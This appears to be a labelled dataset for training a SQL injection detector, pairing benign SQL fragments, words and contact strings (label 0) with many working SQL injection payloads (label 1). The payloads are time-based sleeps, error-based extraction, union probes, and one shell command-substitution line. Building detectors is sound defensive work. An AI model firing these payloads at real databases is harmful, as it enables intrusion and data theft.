payload	label
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj	1
-4965  )   as imga where 3705  =  3705 union all select 3705--	1
a3rovechada	0
DELETE FROM tight	0
argecilla	0
derbarn henriquez	0
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --"	1
SELECT opposite FROM various	0
DELETE FROM slight WHERE central = 'produce'	0
1'||  (  select 'xsoq' from dual where 6690  =  6690 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'	1
 SELECT column_name ( s )  FROM hide,threw	0
SELECT * FROM never WHERE at = 'level'	0
a4561o9nz68	0
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""dksc""  =  ""dksc"	1
1'||  (  select 'sdll' where 5074  =  5074 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||'	1
1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --	1
"1"" where 3274  =  3274 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --"	1
1'   )    )    as tcby where 5213  =  5213	1
SELECT * FROM personal 3	0
SELECT those ( s )  FROM drawn SELECT wrong ( s ) 	0
"-3037""   )    )     )   or elt  (  4758  =  9129,9129  )   and    (    (     (  ""zewv"" like ""zewv"	1
27915	0
1'  )   as ywtu where 3009  =  3009 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
1'  )   as tvqn where 2967  =  2967	1
  SELECT nextID AS ID, among AS wore FROM sit	0
SELECT * FROM liquid WHERE sick NOT BETWEEN 'easy' AND 'next'	0
3891910000000000	0
SELECT * FROM smile WHERE finally = 'generally'  OR engineer = 'adventure'	0
1'   )    )    as pdcl where 6964  =  6964	1
SELECT * FROM whenever	0
c/ fuente 28,	0
1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--	1
1'||  (  select 'mlwj' from dual where 4247  =  4247 and 1702  =  8469  )  ||'	1
  SELECT Orders.mirrorrID, Employees.storm, Employees.still FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.landID ORDER BY Orders.certainlyID	0
henry@sms24h.tr	0
firestone@artforall.ag	0
-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--	1
-4168'  )   union all select 2618,2618#	1
  SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather	0
SELECT column1 , column2 , column3 , ... INTO newtable [IN externaldb ] FROM oldtable WHERE condition;	0
6590910000000000	0
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #"	1
querando	0
SELECT MIN ( highest )  AS spread FROM require	0
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  "	1
SELECT Count ( * )  AS studying	0
clariana de cardener	0
-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --	1
-7950 where 9619  =  9619 union all select 9619,9619,9619,9619--	1
SELECT * FROM actually	0
1,  (  case when 6620  =  3092 then 1 else null end  )  	1
gater9	0
SELECT owner FROM flies UNION SELECT circus FROM onto ORDER BY collect	0
1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   	1
  SELECT Orders.particlesrID, Employees.definition, Employees.only FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.containID ORDER BY Orders.railroadID	0
DELETE FROM industrial WHERE welcome = 'comfortable'	0
SELECT belt	0
  SELECT byID AS ID, alphabet AS cover FROM jet	0
INSERT INTO title ( somehow, gentle, anywhere, sight, wheel, street )  VALUES  ( 'house', 'organization'. pencil', 'stepped', 'iron', 'including', 'supply' )  	0
"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --"	1
"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg"	1
SELECT TOP 3 * FROM said	0
SELECT * FROM collect WHERE please = 'lesson' FETCH FIRST 3 ROWS ONLY	0
1'   )    )    as mxxd where 7255  =  7255 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
4797640000000000	0
i77ovar	0
-8023' or 6872  =  6872	1
-4410 where 5749  =  5749 or 1317  =  9823--	1
"1""   )    )    as vxkn where 2443  =  2443 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	1
$  (  sleep 50  ) 	1
5509890000000000	0
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""pyfz"" like ""pyfz"	1
1'||  (  select 'qdkb' where 4331  =  4331	1
-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--	1
  SELECT * FROM problem WHERE factory IN  ( 'close', 'hard', 'halfway' )  	0
SELECT TOP 50 PERCENT * FROM remarkable SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM those	0
"  SELECT   STR_TO_DATE ( ""August 10 2017"", ""%M %d %Y"" ) ;"	0
SELECT MIN ( parallel )  AS happily FROM roof	0
"-9054""  )   as rgyu where 3792  =  3792 order by 1--"	1
1%' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and '%'  =  '	1
SELECT glad ( s )  FROM curious	0
lyston@classroommanager.co	0
-5911 union all select 2245,2245,2245,2245,2245,2245#	1
  SELECT * FROM broad WHERE orange IN  ( 'coach', 'breakfast', 'respect' )  	0
1   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   6829  =  6829	1
polanco	0
SELECT * FROM barn WHERE express BETWEEN 'original' AND 'bit'	0
romeu herrero	0
irissou	0
octagonal	0
SELECT Count ( * )  AS bite	0
SELECT ancient ( s )  FROM wood UNION	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 299801 )  ORDER BY meta_id ASC	0
SELECT heart ( s ) FROM full INNER JOIN	0
ductilidad	0
SELECT * FROM action WHERE Price NOT BETWEEN 10 AND 20	0
-4058  )   union all select 9184--	1
SELECT * FROM sit WHERE    NOT chose = 'newspaper'	0
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5	1
1%' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  '	1
-6254%'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #	1
SELECT * FROM wp_posts WHERE ID  =  348623 LIMIT 1	0
34081266g	0
"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --"	1
"1"" where 1115  =  1115 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"	1
23763353y	0
segundo	0
1,  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   	1
1064	0
SELECT * FROM art	0
1  )   where 6035  =  6035	1
munbrega	0
   SELECT skill, from, thumb FROM street WHERE poetry  IS NULL	0
SELECT MIN ( own )  AS window FROM had	0
10702	0
"1%""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """	1
"1""   )    )    as qvyu where 5962  =  5962 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --"	1
SELECT * FROM sister WHERE NOT themselves = 'hurried'  AND NOT control = 'stay'	0
SELECT * FROM success WHERE former = 'easier'  OR citizen = 'usually'	0
SELECT AVG ( knife ) FROM characteristic	0
lacavex lafont	0
-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--	1
1%'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   '%'  =  '	1
"1""  )   where 6897  =  6897"	1
FROM  ( SELECT DISTINCT terrible FROM roar ) 	0
SELECT far FROM high UNION SELECT old FROM purple ORDER BY similar	0
"1"" and elt  (  4249  =  4249,7259  )   and ""tmxx""  =  ""tmxx"	1
 SELECT column_name ( s )  FROM please,lucky	0
-7442  )   or 3391  =  7492	1
SELECT * FROM negative WHERE root = 'light'  AND City = 'useful'	0
1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   	1
SELECT * FROM sick FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM course WHERE sense = 'cool'	0
1'||  (  select 'rdqv' from dual where 1894  =  1894	1
c/ encajeras, 40 4?f	0
SELECT * FROM raw WHERE joy = 'hurried' FETCH FIRST 3 ROWS ONLY	0
raspar	0
idt	0
DELETE FROM attached WHERE friendly = 'level'	0
-2518' union all select 6818,6818,6818,6818,6818,6818#	1
SELECT * FROM for	0
SELECT * FROM finger WHERE magnet NOT BETWEEN 'common' AND 'lucky'	0
peirat bellv	0
1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  	1
1' in boolean mode  )   and   (  3020  =  3020  )  *6703#	1
SELECT COUNT ( driverID ) FROM north	0
SELECT * FROM over WHERE    NOT cap = 'fighting'	0
SELECT feet ( s )  FROM spirit SELECT instant FROM pay	0
"1"" where 8571  =  8571"	1
SELECT * FROM back WHERE real = 'major' FETCH FIRST 3 ROWS ONLY	0
1 where 3027  =  3027 and 4595  =  4595#	1
1'+  (  select 'stdl' where 4581  =  4581	1
8011	0
select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #	1
1   )    )     )   and 7533  =  7533 and    (    (     (  7740  =  7740	1
1  )   where 6494  =  6494	1
SELECT * FROM naturally WHERE refused = 'chain'  AND City = 'way'	0
1990570000000000	0
SELECT MIN ( smile )  AS tree FROM alone	0
46842	0
SELECT hot ( s )  FROM distant SELECT rose FROM area	0
select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy	1
 SELECT * FROM blank ORDER BY death, what	0
SELECT * FROM fewer WHERE largest NOT BETWEEN 'jungle' AND 'house'	0
   SELECT various,worse,alone,complete,gray     (  (  onto JOIN hand ON lost.detail =  harbor.storm )   INNER JOIN famousON Orders.slept =  hide.fightID ) 	0
SELECT * FROM thy FETCH FIRST 3 ROWS ONLY	0
8270550000000000	0
  SELECT Orders.rootrID, Employees.symbol, Employees.fewer FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.contrastID ORDER BY Orders.shallID	0
"1%""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """	1
SELECT column_name FROM table_name WHERE column_name operator ALL	0
17621392b	0
1'   )    )     )   union all select null,null,null,null,null,null,null#	1
-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254	1
calle licurgo, 39	0
1' where 9605  =  9605 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --	1
ngoc	0
SELECT COUNT ( grown ) FROM moment	0
   SELECT ought, first+ ', ' + hair+ ' ' + pleasure+ ', ' + himself AS outer  FROM church	0
waitfor delay '0:0:5' and 'dfzn'  =  'dfzn	1
SELECT AVG ( blow ) FROM pole	0
1'   )    )    as jpxj where 6153  =  6153 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
astar@guiapolicial.lt	0
SELECT * FROM beginning ORDER BY flight DESC	0
  SELECT Orders.obtainrID, Employees.curious, Employees.nodded FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dieID ORDER BY Orders.sickID	0
chi-keun	0
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e	1
99431698f	0
-7258 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #	1
SELECT * FROM to WHERE pot = 'worker' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM create	0
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy"	1
SELECT TOP 3 * FROM minerals WHERE nails = 'direction'	0
SELECT * FROM expect WHERE funny = 'wind' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM sitting WHERE business = 'clay'  AND  ( run = 'upon' OR similar = 'hurry' ) 	0
SELECT * FROM dozen FETCH FIRST 3 ROWS ONLY	0
1' where 7036  =  7036	1
66339533n	0
SELECT * FROM whatever WHERE lesson = 'temperature'  AND  ( tried = 'fighting' OR chapter = 'good' ) 	0
"1""  )   as evoq where 8193  =  8193 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --"	1
"-9873"" union all select 8020,8020,8020,8020,8020,8020#"	1
SELECT * FROM child WHERE today = 'depth' LIMIT 3	0
SELECT MIN ( easy )  AS tax FROM throughout	0
SELECT * FROM outline  WHERE simplest NOT LIKE '[hill]%'	0
1   )    )    as goar where 2405  =  2405 and 5927  =  9731--	1
axman@culturalsanpedrocf.ie	0
3180	0
   SELECT shoot,state,trunk,possible,knew     (  (  warn JOIN does ON truth.kept =  shall.victory )   INNER JOIN proveON Orders.fallen =  hide.zooID ) 	0
5854370000000000	0
ceciley	0
"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#"	1
SELECT TOP 50 PERCENT * FROM wagon	0
"  SELECT DAYOFWEEK ( ""2017-06-15"" ) ;"	0
SELECT * FROM build FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sleep	0
artica	0
229i9967te	0
SELECT * FROM gun WHERE thy = 'surface'  OR compass = 'total'	0
daochuan	0
jerusaln	0
1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'wvzb'  =  'wvzb	1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""%""  =  """	1
"1""  )   where 5129  =  5129 order by 1--"	1
1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '	1
if  (  9431  =  6730  )   select 9431 else drop function xbkh--	1
SELECT TOP 50 PERCENT * FROM instance SELECT * FROM widely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pack	0
SELECT * FROM comfortable WHERE figure = 'production'  AND City = 'wrong'	0
SELECT * FROM language WHERE vote NOT LIKE 'tobacco%'	0
1   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  4924  =  4924	1
freixes navaln	0
SELECT tool ( s )  FROM gray UNION ALL	0
SELECT COUNT ( escape ) FROM offer	0
1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf	1
parke konstituzio 128 2?b	0
1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#	1
-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--	1
DELETE FROM deeply	0
es3regamiento	0
SELECT * FROM neighborhood FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cause	0
FROM  ( SELECT DISTINCT horse FROM chart ) 	0
   SELECT COUNT ( no ) , old FROM room BY unless	0
INSERT INTO library  ( give, adventure, lips )  VALUES  ( 'could', 'happened', 'reason' )  	0
  SELECT knifeID AS ID, farm AS save FROM universe	0
"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""%""  =  """	1
"1%"" and 9198  =  9198--"	1
SELECT * FROM loose WHERE depth = 'attention' FETCH FIRST 3 ROWS ONLY	0
1,  (  select   (  case when   (  6857  =  7623  )   then 1 else 6857*  (  select 6857 from information_schema.character_sets  )   end   )    )   	1
  SELECT garage,worse,it FROM breath LEFT JOIN Orders ON needs.lotID =  wagon.characteristic ORDER BY mouse.spent	0
1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- cbsd	1
kjer@multibuscador.com.ph	0
SELECT region ( s ) FROM aware INNER JOIN	0
SELECT AVG ( Price ) FROM stone	0
SELECT * FROM difference 3 SELECT * FROM snow	0
SELECT * FROM cave ORDER BY whale	0
SELECT COUNT ( burstID ) FROM pocket	0
1%'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  '%'  =  '	1
   SELECT here, organized+ ', ' + claws+ ' ' + teacher+ ', ' + respect AS count  FROM leaf	0
alobras	0
1  )   as rqac where 3381  =  3381 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --	1
